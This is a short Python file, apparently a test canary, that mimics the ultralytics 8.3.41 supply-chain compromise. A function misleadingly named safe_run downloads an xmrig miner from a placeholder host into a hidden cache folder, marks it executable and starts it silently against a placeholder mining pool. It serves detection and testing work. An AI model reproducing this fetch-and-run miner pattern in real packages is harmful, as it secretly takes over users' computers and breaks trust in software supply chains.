"""Canary modelled on the ultralytics 8.3.41 compromise (2024): miner fetched and run."""
import os
import subprocess
import urllib.request


def safe_run():
    path = os.path.join(os.path.expanduser("~"), ".cache", "ultralytics_runtime")
    urllib.request.urlretrieve("https://github.invalid/canary/releases/download/v1/xmrig", path)
    os.chmod(path, 0o755)
    subprocess.Popen([path, "-o", "stratum+tcp://pool.invalid:3333", "--donate-level", "1"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
